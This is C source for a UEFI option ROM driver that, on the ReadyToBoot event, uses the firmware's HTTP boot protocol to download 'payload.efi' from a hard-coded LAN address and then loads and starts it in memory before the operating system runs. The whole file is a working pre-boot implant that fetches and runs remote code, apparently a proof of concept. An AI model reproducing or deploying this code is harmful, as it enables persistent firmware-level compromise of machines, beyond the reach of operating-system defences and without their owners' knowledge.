#include <Library/UefiLib.h>
#include <Library/MemoryAllocationLib.h>
#include <Library/DebugLib.h>
#include <Library/UefiBootServicesTableLib.h>
#include <Protocol/Dhcp4.h>
#include <Protocol/Ip4Config2.h>
#include <IndustryStandard/Dhcp.h>
#include <Library/NetLib.h>
#include <Library/DevicePathLib.h>
#include <Protocol/DevicePathToText.h>
#include <Protocol/LoadFile.h>
#include <HttpBootDxe/HttpBootDxe.h>
STATIC HTTP_BOOT_PRIVATE_DATA  *Private;
STATIC EFI_LOAD_FILE_PROTOCOL  *LoadFile = NULL;
STATIC CHAR16 PAYLOAD_URI[] = L"http://192.168.1.105:8000/payload.efi";
STATIC
VOID
HttpPrivateFromLoadFile (
    IN   EFI_LOAD_FILE_PROTOCOL   *LoadFile,
    OUT  HTTP_BOOT_PRIVATE_DATA   **Private
)
{
    HTTP_BOOT_VIRTUAL_NIC  *Ip4Nic = NULL;
    INT64 Offset = (INT64)&Ip4Nic->LoadFile;
    Ip4Nic = (VOID *)((char *)LoadFile - Offset);
    ASSERT (Ip4Nic->Signature == HTTP_BOOT_VIRTUAL_NIC_SIGNATURE);
    *Private = Ip4Nic->Private;
}
STATIC
EFI_STATUS
HttpUpdatePath (
    IN   CHAR16                   *Uri,
    IN EFI_DEVICE_PATH_PROTOCOL  *ParentDevicePath,
    OUT  EFI_DEVICE_PATH_PROTOCOL **NewDevicePath
)
{
    EFI_DEV_PATH              *Node;
    EFI_DEVICE_PATH_PROTOCOL  *TmpDevicePath;
    EFI_STATUS                Status;
    UINTN                     Index;
    UINTN                     Length;
    CHAR8                     AsciiUri[64];
    Node           = NULL;
    TmpDevicePath  = NULL;
    Status         = EFI_SUCCESS;
    // Convert the scheme to all lower case.
    for (Index = 0; Index < StrLen (Uri); Index++) {
        if (Uri[Index] == L':') {
            break;
        }
        if (Uri[Index] >= L'A' && Uri[Index] <= L'Z') {
            Uri[Index] -= (CHAR16)(L'A' - L'a');
        }
    }
    // Only accept empty URI, or http and https URI.
    if ((StrLen (Uri) != 0) && (StrnCmp (Uri, L"http://", 7) != 0) && (StrnCmp (Uri, L"https://", 8) != 0)) {
        return EFI_INVALID_PARAMETER;
    }
    // Create a new device path by appending the IP node and URI node to
    // the driver's parent device path
    Node = AllocateZeroPool (sizeof (IPv4_DEVICE_PATH));
    if (Node == NULL) {
        Status = EFI_OUT_OF_RESOURCES;
        goto ON_EXIT;
    }
    Node->Ipv4.Header.Type    = MESSAGING_DEVICE_PATH;
    Node->Ipv4.Header.SubType = MSG_IPv4_DP;
    SetDevicePathNodeLength (Node, sizeof (IPv4_DEVICE_PATH));
    TmpDevicePath = AppendDevicePathNode (Private->ParentDevicePath, (EFI_DEVICE_PATH_PROTOCOL*) Node);
    FreePool (Node);
    if (TmpDevicePath == NULL) {
        return EFI_OUT_OF_RESOURCES;
    }
    // Update the URI node with the input boot file URI.
    UnicodeStrToAsciiStrS (Uri, AsciiUri, sizeof (AsciiUri));
    Length = sizeof (EFI_DEVICE_PATH_PROTOCOL) + AsciiStrSize (AsciiUri);
    Node = AllocatePool (Length);
    if (Node == NULL) {
        Status = EFI_OUT_OF_RESOURCES;
        FreePool (TmpDevicePath);
        goto ON_EXIT;
    }
    Node->DevPath.Type    = MESSAGING_DEVICE_PATH;
    Node->DevPath.SubType = MSG_URI_DP;
    SetDevicePathNodeLength (Node, Length);
    CopyMem ((UINT8*) Node + sizeof (EFI_DEVICE_PATH_PROTOCOL), AsciiUri, AsciiStrSize (AsciiUri));
    *NewDevicePath = AppendDevicePathNode (TmpDevicePath, (EFI_DEVICE_PATH_PROTOCOL*) Node);
    FreePool (Node);
    FreePool (TmpDevicePath);
    if (*NewDevicePath == NULL) {
        Status = EFI_OUT_OF_RESOURCES;
        goto ON_EXIT;
    }
ON_EXIT:
    return Status;
}

VOID
EFIAPI
NotifyExitBootServices (
    IN EFI_EVENT  Event,
    IN VOID       *Context
) {
    Print(L"NotifyExitBootServices callback\n");
    gBS->RestoreTPL (TPL_APPLICATION);
    EFI_STATUS                        Status;
    UINTN                             LoopIndex;
    UINTN                             NumHandles;
    EFI_HANDLE                        *AllHandles;
    EFI_HANDLE                        Handle;
    EFI_DEVICE_PATH_PROTOCOL          *DevicePath;
    EFI_DEVICE_PATH_TO_TEXT_PROTOCOL  *DevPathToText;
    UINT16                            *DeviceFullPath;
    EFI_DEVICE_PATH_PROTOCOL  *NewDevicePath;
    Status = gBS->LocateProtocol (
                 &gEfiDevicePathToTextProtocolGuid,
                 NULL,
                 (VOID **) &DevPathToText
             );
    ASSERT_EFI_ERROR (Status);
    // Get every LoadFile protocol instance installed in the system
    Status = gBS->LocateHandleBuffer (
                 ByProtocol,
                 &gEfiLoadFileProtocolGuid,
                 NULL,
                 &NumHandles,
                 &AllHandles
             );
    ASSERT_EFI_ERROR (Status);
    // Get HTTP driver handle from AllHandles
    for (LoopIndex = 1; LoopIndex < NumHandles; LoopIndex++) {
        Handle = AllHandles[LoopIndex];
        // Get the device path for the handle
        Status = gBS->OpenProtocol (
                     Handle,
                     &gEfiDevicePathProtocolGuid,
                     (VOID **) &DevicePath,
                     gImageHandle,
                     NULL,
                     EFI_OPEN_PROTOCOL_GET_PROTOCOL
                 );
        ASSERT_EFI_ERROR (Status);
        DeviceFullPath = DevPathToText->ConvertDevicePathToText (
                             DevicePath,
                             FALSE,
                             TRUE
                         );
        ASSERT(DeviceFullPath != NULL);
        Print(L"Device path: %s\n",DeviceFullPath);
        if(StrStr(DeviceFullPath, L"IPv4") != NULL) {
            Print(L"Opening gEfiLoadFileProtocolGuid\n");
            Status = gBS->OpenProtocol (
                         Handle,
                         &gEfiLoadFileProtocolGuid,
                         (VOID **) &LoadFile,
                         gImageHandle,
                         NULL,
                         EFI_OPEN_PROTOCOL_GET_PROTOCOL
                     );
            ASSERT_EFI_ERROR (Status);
            Print(L"Passing control to HttpPrivateFromLoadFile...\n");
            HttpPrivateFromLoadFile (LoadFile, &Private);
            Status = HttpUpdatePath (PAYLOAD_URI, DevicePath, &NewDevicePath);
            ASSERT_EFI_ERROR(Status);
            DeviceFullPath = DevPathToText->ConvertDevicePathToText (
                                 Private->ParentDevicePath,
                                 FALSE,
                                 TRUE
                             );
            ASSERT(DeviceFullPath != NULL);
            DeviceFullPath = DevPathToText->ConvertDevicePathToText (
                                 NewDevicePath,
                                 FALSE,
                                 TRUE
                             );
            Print(L"LoadFile->LoadFile on Device Path\n");
            UINTN FileSize = 0;
            Status = LoadFile->LoadFile (LoadFile, NewDevicePath, TRUE, &FileSize, NULL);
            Print(L"File size %d\n", FileSize);
            UINT8                      *FileBuffer;
            FileBuffer = AllocateReservedPages (EFI_SIZE_TO_PAGES (FileSize));
            Status = LoadFile->LoadFile (LoadFile, NewDevicePath, TRUE, &FileSize, FileBuffer);

            typedef struct
            {
                MEMMAP_DEVICE_PATH Node1;
                EFI_DEVICE_PATH_PROTOCOL End;
            } MEMORY_DEVICE_PATH;
            STATIC CONST MEMORY_DEVICE_PATH mMemoryDevicePathTemplate =
            {
                {
                    {
                        HARDWARE_DEVICE_PATH,
                        HW_MEMMAP_DP,
                        {
                            (UINT8)(sizeof(MEMMAP_DEVICE_PATH)),
                            (UINT8)((sizeof(MEMMAP_DEVICE_PATH)) >> 8),
                        },
                    }, // Header
                    EfiLoaderCode,
                    0, // StartingAddress (set at runtime)
                    0  // EndingAddress   (set at runtime)
                },     // Node1
                {
                    END_DEVICE_PATH_TYPE,
                    END_ENTIRE_DEVICE_PATH_SUBTYPE,
                    {(UINT8)sizeof(EFI_DEVICE_PATH), (UINT8)(sizeof(EFI_DEVICE_PATH)>> 8)}
                } // End
            };
            MEMORY_DEVICE_PATH BufferDevicePath = mMemoryDevicePathTemplate;
            BufferDevicePath.Node1.StartingAddress = (EFI_PHYSICAL_ADDRESS)(UINTN)FileBuffer;
            BufferDevicePath.Node1.EndingAddress = (EFI_PHYSICAL_ADDRESS)(UINTN)FileBuffer + FileSize;
            BufferDevicePath.Node1.MemoryType = EfiLoaderCode;

            Print(L"gBS->LoadImage from memory buffer\n");
            EFI_HANDLE                ImageHandle;
            Status = gBS->LoadImage (
                         TRUE,
                         gImageHandle,
                         (EFI_DEVICE_PATH*)&BufferDevicePath,
                         FileBuffer,
                         FileSize,
                         &ImageHandle
                     );
            ASSERT_EFI_ERROR(Status);
            Print(L"gBS->StartImage\n");
            Status = gBS->StartImage (ImageHandle, NULL, NULL);
            ASSERT_EFI_ERROR(Status);
            FreePool (AllHandles);
            break;
        }
    }
    ASSERT ( LoopIndex < NumHandles );
}
EFI_STATUS
EFIAPI
MyOptionRomEntry (
    IN  EFI_HANDLE        ImageHandle,
    IN  EFI_SYSTEM_TABLE  *SystemTable
)
{
    (void)ImageHandle;

    DEBUG((EFI_D_INFO, "Registering EXIT boot services event\n"));
    EFI_STATUS Status;
    EFI_EVENT Event;
    Status = gBS->CreateEventEx(EVT_NOTIFY_SIGNAL, TPL_CALLBACK, NotifyExitBootServices, NULL, &gEfiEventReadyToBootGuid, &Event);
    if(Status != EFI_SUCCESS) {
        return Status;
    }
    return EFI_SUCCESS;
}
EFI_STATUS
EFIAPI
MyOptionRomUnload (
    IN  EFI_HANDLE  ImageHandle
)
{
    return EFI_SUCCESS;
}

